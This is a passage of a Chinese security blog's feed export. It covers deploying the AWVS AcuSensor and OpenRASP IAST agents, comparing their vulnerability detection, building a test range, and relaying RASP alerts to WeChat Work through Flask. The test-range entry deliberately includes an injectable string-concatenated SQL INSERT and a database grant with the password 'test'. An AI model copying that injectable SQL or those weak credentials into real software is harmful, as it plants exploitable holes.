class="title">Dacusensor</span>.<span class="title">debug</span>.<span class="title">log</span>=<span class="title">ON</span>&quot;</span></span><br><span class="line">save <span class="keyword">the</span> <span class="built_in">file</span></span><br><span class="line">run <span class="keyword">the</span> <span class="keyword">command</span>: <span class="title">sudo</span> <span class="title">systemctl</span> <span class="title">restart</span> <span class="title">tomcat9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Note: The parameter <span class="string">&quot;-Dacusensor.debug.log=ON&quot;</span> is optional, <span class="keyword">and</span> can be omitted. If this parameter is retained, this will output AcuSensor logging <span class="keyword">as</span> additional <span class="keyword">lines</span> <span class="keyword">in</span> <span class="keyword">the</span> Tomcat logs starting <span class="keyword">with</span> <span class="string">&quot;[Acunetix-debug]&quot;</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2.3</span><span class="number">.4</span> Disabling <span class="keyword">and</span> Removing AcuSensor <span class="keyword">for</span> JAVA</span><br><span class="line"></span><br><span class="line">To remove <span class="keyword">and</span> disable <span class="keyword">the</span> sensor <span class="built_in">from</span> your website you need <span class="built_in">to</span> revert <span class="keyword">the</span> changes done during <span class="keyword">the</span> deployment <span class="keyword">of</span> <span class="keyword">the</span> Agent. Based <span class="keyword">on</span> <span class="title">the</span> <span class="title">assumptions</span> <span class="title">above</span>:</span><br><span class="line"></span><br><span class="line">Remove <span class="keyword">the</span> Acunetix JAVA AcuSensor (AcuSensor.jar) <span class="built_in">from</span> <span class="keyword">the</span> <span class="built_in">folder</span> where <span class="keyword">it</span> was deployed <span class="keyword">with</span>:</span><br><span class="line">rm /opt/tomcat9/lib/AcuSensor.jar</span><br><span class="line">Remove aspectjweaver.jar <span class="keyword">with</span>:</span><br><span class="line">sudo rm /opt/tomcat9/lib/aspectjweaver.jar</span><br><span class="line">sudo rm /opt/tomcat9/lib/aspectjweaver<span class="number">-1.9</span><span class="number">.5</span>.jar</span><br><span class="line">Reconfigure Tomcat <span class="keyword">with</span> Load Time Weaving disabled:</span><br><span class="line">remove <span class="keyword">the</span> <span class="string">&quot;JAVA_OPTS&quot;</span> <span class="built_in">line</span> added earlier <span class="keyword">in</span> <span class="keyword">the</span> setenv.sh <span class="built_in">file</span></span><br><span class="line">run <span class="keyword">the</span> <span class="keyword">command</span>: <span class="title">sudo</span> <span class="title">systemctl</span> <span class="title">restart</span> <span class="title">tomcat9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Note: Although <span class="keyword">the</span> Acunetix AcuSensor agent is secured <span class="keyword">with</span> <span class="keyword">a</span> strong password, <span class="keyword">it</span> is recommended that <span class="keyword">the</span> AcuSensor client <span class="built_in">files</span> are uninstalled <span class="keyword">and</span> removed <span class="built_in">from</span> <span class="keyword">the</span> web application <span class="keyword">if</span> they are no longer <span class="keyword">in</span> use.</span><br></pre></td></tr></table></figure><p>注：官方案例中使用tomcat9 ，本地tomcat8中未找到改sh文件</p><p>这里在catalina.sh中cygwin=false这行上面加入以下代码</p><p><code>JAVA_OPTS=&quot;$JAVA_OPTS -javaagent:/www/server/tomcat/lib/aspectjweaver.jar -Dacusensor.debug.log=ON&quot;</code></p><p>这里重启tomcat即可开始iast插装扫描</p><h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>对比awvs扫描，开启AcuSensor，开启后扫描目标会有<code>AcuSensor</code>图标</p><p><img src="https://pic.rmb.bdstatic.com/bjh/cf34afa5fd88b0d931bf7160ddf23887.png" alt="image.png"></p><p><img src="https://pic.rmb.bdstatic.com/bjh/53e2bc0b2e7e33b6d9eb2c7ef5003da4.png" alt="image.png"></p><p><img src="https://pic.rmb.bdstatic.com/bjh/11c045db00fdb26ff3bdbd5b4d1c9ee9.png" alt="image.png"></p><p>为了确保漏洞覆盖，这里使用<code>BURP</code>录制一份测试靶场的流量，导入到AWVS中</p><p><img src="https://pic.rmb.bdstatic.com/bjh/77066693b682cc7a368444a91c3a1672.png" alt="image.png"></p><p>新建目标，导入文件</p><p><img src="https://pic.rmb.bdstatic.com/bjh/92a7c4bf7e362b603109cf1a100bd4ba.png" alt="image.png"></p><h2 id="0x04-测试结果"><a href="#0x04-测试结果" class="headerlink" title="0x04 测试结果"></a>0x04 测试结果</h2><h3 id="4-1-常规漏洞项测试"><a href="#4-1-常规漏洞项测试" class="headerlink" title="4.1 常规漏洞项测试"></a>4.1 常规漏洞项测试</h3><blockquote><p>默认配置，结果不准确</p></blockquote><table><thead><tr><th>常规漏洞测试项</th><th>扫描结果</th><th>IAST检测</th></tr></thead><tbody><tr><td>目录遍历</td><td>√</td><td>√</td></tr><tr><td>任意文件读取</td><td>√</td><td>√</td></tr><tr><td>命令执行</td><td>×</td><td>×</td></tr><tr><td>XXE</td><td>×</td><td>×</td></tr><tr><td>文件上传</td><td>√</td><td>×</td></tr><tr><td>反序列化漏洞</td><td>×</td><td>×</td></tr><tr><td>ssrf</td><td>×</td><td>×</td></tr><tr><td>sql注入</td><td>√</td><td>√</td></tr><tr><td>xss</td><td>√</td><td>×</td></tr><tr><td>struts命令执行</td><td>√</td><td>×</td></tr><tr><td>fastjson反序列化</td><td>×</td><td>×</td></tr><tr><td>逻辑漏洞（越权）</td><td>×</td><td>×</td></tr></tbody></table><h3 id="4-2-脏数据测试"><a href="#4-2-脏数据测试" class="headerlink" title="4.2 脏数据测试"></a>4.2 脏数据测试</h3><p>根据openrasp靶场修改一下，进行insert操作</p><p><a href="http://192.168.244.129:8080/vulns/insert.jsp">http://192.168.244.129:8080/vulns/insert.jsp</a></p><p><img src="https://pic.rmb.bdstatic.com/bjh/dce7355d473b9fe072f3715184461a62.png" alt="image.png"></p><p>查询数据库，可以看到表内有3条数据</p><p><img src="https://pic.rmb.bdstatic.com/bjh/cdaa6d8beb56333840c10e2524421dd2.png" alt="image.png"></p><p>开启IAST扫描</p><p><img src="https://pic.rmb.bdstatic.com/bjh/67ed97d4628fe548ced691984652939b.png" alt="image.png"></p><p>依赖awvs主动扫描，这里插入了340条脏数据</p><blockquote><p>这里测试时，扫描规则为默认，实际脏数据可能会少些</p></blockquote><p><img src="https://pic.rmb.bdstatic.com/bjh/82376b7e97194b438590f6fa28457033.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;很久没有更新blog了，这次把几个笔记分享一下，AWVS自带的IAST功能，很多人都不知道，这里记录一下IAST如何使用&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="SDL" scheme="http://www.pa55w0rd.online/tags/SDL/"/>
    
  </entry>
  
  <entry>
    <title>百度开源OpenRASP - IAST使用</title>
    <link href="http://www.pa55w0rd.online/openrasp-iast/"/>
    <id>http://www.pa55w0rd.online/openrasp-iast/</id>
    <published>2021-05-14T02:00:30.000Z</published>
    <updated>2021-05-14T03:25:54.451Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>相对于awvs和netsparker的IAST，百度iast为主动型插桩技术，无需人工配置任务及代理等，由agent采集请求及hook点信息，自动选择扫描漏洞类型，极大的增加覆盖率和效率，减少脏数据产生</p><p>主动型扫描，不适用于参数加密、编码、防重放等场景</p><p>管理后台部署参考 <a href="https://www.pa55w0rd.online/openrasp-web/">OpenRASP 部署</a></p><span id="more"></span><h2 id="0x01-开启灰盒扫描"><a href="#0x01-开启灰盒扫描" class="headerlink" title="0x01 开启灰盒扫描"></a>0x01 开启灰盒扫描</h2><p>参考 <a href="https://rasp.baidu.com/doc/install/iast.html">安装灰盒扫描工具</a></p><table><thead><tr><th>项目</th><th>IAST</th><th>SAST</th><th>DAST</th></tr></thead><tbody><tr><td>测试覆盖度</td><td>高，由功能测试覆盖度保障</td><td>高</td><td>低</td></tr><tr><td>检出率</td><td>高</td><td>高</td><td>中</td></tr><tr><td>误报率</td><td>低</td><td>高，需要编写规则</td><td>低</td></tr><tr><td>扫描效率</td><td>准实时检测</td><td>非实时，与程序复杂度、代码量相关</td><td>非实时，程序越复杂，安全测试用例就越多</td></tr><tr><td>扫描报告</td><td>包含动态数据流、请求响应、应用代码信息</td><td>只有静态代码信息</td><td>只有请求和响应信息</td></tr><tr><td>并发检测</td><td>资源消耗分布端上，可支持上百个任务</td><td>CPU 消耗较大</td><td>网络资源消耗</td></tr><tr><td>语言支持</td><td>区分不同语</td><td>区分不同语</td><td>不区分语言</td></tr><tr><td>框架支持</td><td>一定程度区分</td><td>一定程度区分</td><td>不区分框架</td></tr><tr><td>使用风险</td><td>无</td><td>无</td><td>脏数据、大流量</td></tr><tr><td>使用成本</td><td>低，基本没有误报</td><td>高，人工排查误报</td><td>低</td></tr><tr><td>开发流程集成度</td><td>无缝集成开发和测试阶段，零成本完成</td><td>安全测试</td><td>开发阶段，成本较高    测试阶段，成本较高</td></tr></tbody></table><blockquote><p>通过综合对比，IAST 不仅解决了传统 DAST 无法精确定位漏洞位置的问题，还有着比传统 SAST 技术低得多的误报率。在脏数据处理、对系统稳定性影响更小，这里对IAST产品做调研</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;相对于awvs和netsparker的IAST，百度iast为主动型插桩技术，无需人工配置任务及代理等，由agent采集请求及hook点信息，自动选择扫描漏洞类型，极大的增加覆盖率和效率，减少脏数据产生&lt;/p&gt;
&lt;p&gt;主动型扫描，不适用于参数加密、编码、防重放等场景&lt;/p&gt;
&lt;p&gt;管理后台部署参考 &lt;a href=&quot;https://www.pa55w0rd.online/openrasp-web/&quot;&gt;OpenRASP 部署&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="SDL" scheme="http://www.pa55w0rd.online/tags/SDL/"/>
    
  </entry>
  
  <entry>
    <title>IAST测试靶场搭建</title>
    <link href="http://www.pa55w0rd.online/iast-test/"/>
    <id>http://www.pa55w0rd.online/iast-test/</id>
    <published>2021-05-14T00:53:09.000Z</published>
    <updated>2021-05-14T03:25:50.609Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>测试用例的选择尽量贴近真实业务使用的场景，覆盖常见的高危漏洞，以及各类请求形式。用于测试IAST产品支持检测漏洞类型、检出率、脏数据插入等等</p><span id="more"></span><h2 id="0x01-靶场选择"><a href="#0x01-靶场选择" class="headerlink" title="0x01 靶场选择"></a>0x01 靶场选择</h2><table><thead><tr><th>靶场</th><th>DVWA</th><th>Openrasp-testcases</th></tr></thead><tbody><tr><td>技术栈</td><td>PHP/MYSQL</td><td>JAVA/PHP/MYSQL</td></tr><tr><td>支持漏洞类型</td><td><a href="https://github.com/digininja/DVWA">https://github.com/digininja/DVWA</a></td><td><a href="https://github.com/baidu-security/openrasp-testcases">https://github.com/baidu-security/openrasp-testcases</a></td></tr></tbody></table><p>考虑到公司使用的技术栈，这里选择了openrasp-testcases用于测试靶场</p><h2 id="0x02-靶场搭建"><a href="#0x02-靶场搭建" class="headerlink" title="0x02 靶场搭建"></a>0x02 靶场搭建</h2><p>环境：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Centos7</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">PHP7</span>.<span class="number">3</span></span><br><span class="line"><span class="attribute">JDK1</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">MYSQL5</span>.<span class="number">6</span></span><br><span class="line"><span class="attribute">APACHE2</span>.<span class="number">4</span></span><br><span class="line"><span class="attribute">TOMCAT8</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">MAVEN3</span>.<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="2-1-JAVA-测试靶场"><a href="#2-1-JAVA-测试靶场" class="headerlink" title="2.1 JAVA 测试靶场"></a>2.1 JAVA 测试靶场</h3><p>mvn编译</p><p>启动tomcat</p><p>启动mysql</p><p>本地靶场：<a href="http://192.168.244.129:8080/manager/html">http://192.168.244.129:8080/manager/html</a></p><p><img src="https://pic.rmb.bdstatic.com/bjh/7fecbe8550249e2d807eaadd547fcddb.png" alt="image.png"></p><h3 id="2-2-PHP测试靶场"><a href="#2-2-PHP测试靶场" class="headerlink" title="2.2 PHP测试靶场"></a>2.2 PHP测试靶场</h3><p>启动apache</p><p>启动php</p><p>启动mysql</p><p>本地靶场</p><p><a href="http://192.168.244.129/">http://192.168.244.129/</a><br><img src="https://pic.rmb.bdstatic.com/bjh/65b814f3f7c7ad8e621fd3d8e3b4e174.png" alt="image.png"></p><h3 id="2-3-脏数据测试"><a href="#2-3-脏数据测试" class="headerlink" title="2.3 脏数据测试"></a>2.3 脏数据测试</h3><p>产生脏数据的原因大多是执行了 数据库的insert语句，这里使用java简单写一个demo用于测试脏数据</p><p>创建数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> test;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> test;         </span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">on</span> test.* <span class="keyword">to</span> <span class="string">&#x27;test&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">on</span> test.* <span class="keyword">to</span> <span class="string">&#x27;test&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> table vuln (</span><br><span class="line">-&gt; <span class="symbol">`id`</span> INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">-&gt; <span class="symbol">`name`</span> VARCHAR(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">-&gt; <span class="keyword">primary</span> <span class="keyword">key</span>(<span class="symbol">`id`</span>)</span><br><span class="line">-&gt; )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><p>清空数据，重置ID</p><p>truncate table vuln;</p><p>MySQL服务器执行SQL记录实时监控，或者直接查询数据库</p><p><a href="https://github.com/cw1997/MySQL-Monitor">https://github.com/cw1997/MySQL-Monitor</a></p><p>执行sql语句</p><p>stmt.executeUpdate(“INSERT INTO vuln(name) VALUES (‘“+id+”‘)”);</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;测试用例的选择尽量贴近真实业务使用的场景，覆盖常见的高危漏洞，以及各类请求形式。用于测试IAST产品支持检测漏洞类型、检出率、脏数据插入等等&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="SDL" scheme="http://www.pa55w0rd.online/tags/SDL/"/>
    
  </entry>
  
  <entry>
    <title>OpenRASP报警推送</title>
    <link href="http://www.pa55w0rd.online/OpenRASP-alert/"/>
    <id>http://www.pa55w0rd.online/OpenRASP-alert/</id>
    <published>2019-11-08T03:17:19.000Z</published>
    <updated>2019-11-08T05:54:16.318Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>OpenRASP 上线一周了，运行很稳定，拉了几个PHP和Java做测试，没有收到业务方的异常反馈，除了我测试的报警外，只发现一些基线的报警，找运维都处理了。</p><p>随着运营时间，后续安全基线问题不应该存在了，重点关注一下攻击事件，系统设置中有报警推送功能，有邮件报警、HTTP报警推送、钉钉集成、syslog报警</p><span id="more"></span><p>我们目前使用的IM是企业微信，企业微信群机器人推送消息使用很方便，我们把很多告警邮件类都修改为群机器人通知了，把RASP也修改一下吧</p><h2 id="0x01-坎坷"><a href="#0x01-坎坷" class="headerlink" title="0x01 坎坷"></a>0x01 坎坷</h2><p>OpenRASP 管理后台使用GO语言开发的，从菜鸟教程上浏览了下go的基础语法，开始搞，因为只是加个报警推送，就不修改前端了</p><p>从Github上把源码下载下来，有点大</p><p>看下目录结构 openrasp\cloud\src\rasp-cloud MVC模型，业务逻辑应该都在models 文件里， 打开app.go</p><p>找到钉钉推送的函数PushDingAttackAlarm， 复制一个按照企业微信群机器人的消息格式修改一下</p><p>群机器人消息格式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;msgtype&quot;</span>: <span class="string">&quot;markdown&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;markdown&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;content&quot;</span>: <span class="string">&quot;content&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到PushAttackAlarm 修改一下</p><p>然后编译 – 上传测试服务器 – 测试报警失败 – 继续修改 – 编译 – 上传测试服务器 – 测试失败 ……</p><img src="/OpenRASP-alert/bengkui.jpg" class="" title="描述"><p>不知道试了多少次，json数据就是处理不好</p><h2 id="0x02-好像瞧见了光明"><a href="#0x02-好像瞧见了光明" class="headerlink" title="0x02 好像瞧见了光明"></a>0x02 好像瞧见了光明</h2><p>不好搞，回头看了下，自带的报警有一个HTTP报警推送，拿Python flask写一个服务做中转，接收报警消息，一个json格式字符串</p><p>那就好办了，处理下数据，测试环境发送给群机器人成功</p><p>群机器人配置一定要开启推送消息IP白名单，不配置则任何IP都可调用，防止泄露被恶意调用</p><p>把脚本放到线上IDC，what，IDC是禁止请求公网的</p><img src="/OpenRASP-alert/wuqing.jpg" class="" title="描述"><h2 id="0x03-柳暗花明"><a href="#0x03-柳暗花明" class="headerlink" title="0x03 柳暗花明"></a>0x03 柳暗花明</h2><p>之前运维开发了一个企业微信通知应用的内网API调用接口，可以使用这个接口将报警推送到企业微信</p><p>下面附上代码（代码写的有点乱，修改的话可以把这个接口换成机器人）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/alert&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alert</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        log = request.json</span><br><span class="line">        <span class="comment"># print(log[&quot;data&quot;][0])</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>  <span class="string">&#x27;server_nic&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> log[<span class="string">&quot;data&quot;</span>][<span class="number">0</span>].keys():  <span class="comment"># 这里做了异常处理，cmdb接口不能为空，不能为127.0.0.1</span></span><br><span class="line">            <span class="comment"># print(&quot;ip不存在&quot;)</span></span><br><span class="line">            systemName = <span class="string">&quot;请登录后台查看&quot;</span></span><br><span class="line">            firstMan = <span class="string">&quot;请登录后台查看&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip = log[<span class="string">&quot;data&quot;</span>][<span class="number">0</span>][<span class="string">&quot;server_nic&quot;</span>][<span class="number">0</span>][<span class="string">&#x27;ip&#x27;</span>].encode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">            <span class="comment"># print(type(ip))  # ip类型为unicode，需要做编码转换</span></span><br><span class="line">            <span class="keyword">if</span> ip == <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">                systemName = <span class="string">&quot;请登录后台查看&quot;</span></span><br><span class="line">                firstMan = <span class="string">&quot;请登录后台查看&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    data = &#123; <span class="string">&quot;ip&quot;</span>: ip &#125;</span><br><span class="line">                    headers = &#123; <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;&#123;cmdb&#125;&quot;</span> &#125;  <span class="comment"># 运维那边的cmdb系统，查询资产信息的,可以去掉</span></span><br><span class="line">                    rep = requests.post(<span class="string">&quot;http://&#123;cmdb&#125;/api/&quot;</span>, data = data, headers = headers, timeout=<span class="number">2</span>)</span><br><span class="line">                    <span class="comment"># print rep.text</span></span><br><span class="line">                    <span class="keyword">if</span> rep.text:</span><br><span class="line">                        content = rep.text.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                        <span class="keyword">for</span> con <span class="keyword">in</span> content:</span><br><span class="line">                            <span class="keyword">if</span> con.startswith(<span class="string">u&quot;系统名称&quot;</span>):</span><br><span class="line">                                systemName = con.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>].encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">                            <span class="keyword">if</span> con.startswith(<span class="string">u&quot;第一负责人&quot;</span>):</span><br><span class="line">                                firstMan = con.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>].encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="comment"># print e</span></span><br><span class="line">                    systemName = <span class="string">&quot;请登录后台查看&quot;</span></span><br><span class="line">                    firstMan = <span class="string">&quot;请登录后台查看&quot;</span></span><br><span class="line"></span><br><span class="line">        content = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">RASP发现攻击成功告警</span></span><br><span class="line"><span class="string">报警时间：&#123;time&#125;</span></span><br><span class="line"><span class="string">攻击类型：&#123;attack&#125;</span></span><br><span class="line"><span class="string">攻击源IP地址：&#123;source&#125;</span></span><br><span class="line"><span class="string">目的URL：&#123;url&#125;</span></span><br><span class="line"><span class="string">系统名称：&#123;sys&#125;</span></span><br><span class="line"><span class="string">第一负责人：&#123;m&#125;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(time=log[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;event_time&#x27;</span>],attack=log[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;attack_type&#x27;</span>],source=log[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;attack_source&#x27;</span>],url=log[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;url&#x27;</span>],sys=systemName, m=firstMan)</span><br><span class="line">        <span class="comment"># print(content)</span></span><br><span class="line">        log_file = <span class="built_in">open</span>(<span class="string">&#x27;./alert.log&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) </span><br><span class="line">        log_file.write(content)</span><br><span class="line">        log_file.close()</span><br><span class="line">        user = <span class="string">&quot;user1|user2&quot;</span></span><br><span class="line">        weixin = <span class="string">&quot;http://&#123;&#125;/wxchat?user=&#123;0&#125;&amp;content=&#123;1&#125;&amp;token=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(user, content) <span class="comment"># api接口，可以换成群里机器人webhook，需要微调下content格式</span></span><br><span class="line">        r = requests.get(weixin, timeout=<span class="number">2</span>)       </span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;sucess&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;message&#x27;</span>: <span class="built_in">str</span>(e)&#125;)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    <span class="comment"># app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-结果"><a href="#0x04-结果" class="headerlink" title="0x04 结果"></a>0x04 结果</h2><p>以Java反序列化和Struts2-019远程命令执行漏洞为例，从json格式报警中找了event_time、attack_type、attack_source、url，其他关键字先忽略了</p><p>报警推送效果</p><img src="/OpenRASP-alert/2.png" class="" title="描述">]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;OpenRASP 上线一周了，运行很稳定，拉了几个PHP和Java做测试，没有收到业务方的异常反馈，除了我测试的报警外，只发现一些基线的报警，找运维都处理了。&lt;/p&gt;
&lt;p&gt;随着运营时间，后续安全基线问题不应该存在了，重点关注一下攻击事件，系统设置中有报警推送功能，有邮件报警、HTTP报警推送、钉钉集成、syslog报警&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="安全防护" scheme="http://www.pa55w0rd.online/tags/%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/"/>
    
  </entry>
  
  <entry>
    <title>OpenRASP 部署</title>
    <link href="http://www.pa55w0rd.online/openrasp-web/"/>
    <id>http://www.pa55w0rd.online/openrasp-web/</id>
    <published>2019-11-04T05:19:50.000Z</published>
    <updated>2019-11-04T05:38:04.547Z</updated>
    
